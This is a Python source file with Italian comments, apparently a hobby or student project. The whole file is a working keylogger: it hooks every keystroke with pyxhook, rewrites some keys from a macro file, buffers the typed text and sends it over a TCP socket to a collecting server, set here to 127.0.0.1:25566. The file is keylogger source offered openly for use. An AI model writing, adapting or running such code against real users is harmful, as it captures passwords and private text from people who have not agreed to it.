#Importo la classe pyxhook che è un tool per la creazione dei keylogger
import pyxhook

import socket
from threading import Thread

#Definisco costanti per la connessione al server
HOST = '127.0.0.1'
PORT = 25566
BUFFER_LENGHT = 10

# Inizializzo a stringa vuota il buffer per l'invio dei caratteri.
buffer = ""

#Funzione per inviare il buffer al server
def send(msg : str):
    s.sendall(msg.encode())

#Funzione che viene richiamata ogni volta che viene premuto un tasto della tastiera
def OnKeyPress(event):
  global buffer

  #Apriamo il file in lettura
  with open("txtfiles/words.txt", "r") as f:
    #Leggiamo tutte le parole e le mettiamo in un insieme
    parole = set(f.read().split())

  #Dichiaro il dizionario
  dizionario = {}

    #Metto nel dizionario le relazioni che ho già scritto in un file di testo
  with open("txtfiles/macro.txt", "r") as f:
      for riga in f:
        valori = riga.strip().split(",")
        chiave = valori[0]
        valore = valori[1]
        dizionario[chiave] = valore

      #Se la Key carpita è una delle chiavi del dizionario la sostituisce con il valore della chiave carpita
      if event.Key in dizionario.keys():
        event.Key = dizionario[event.Key]

  #If the keystroke is SPACE it will be written \n in the file
  if event.Key in parole:
    carattere_rilevato = ''
  elif event.Key == "space" or event.Key == "Return":
    carattere_rilevato = ('\n')
  else:
    carattere_rilevato = (event.Key)

  buffer = buffer + carattere_rilevato
  print (buffer)
  if len(buffer) > BUFFER_LENGHT:
    Thread(target=send, args=(buffer,)).start()
    buffer = ""

  #If ESC is pressed the script ends
  if event.Key=="Escape": 
    new_hook.cancel()
    
# Connection open
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((HOST, PORT))
    print ("Connection enstablished with server")
except socket.error:
    print ("Error: unable to connect to remote server")

#Session init
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()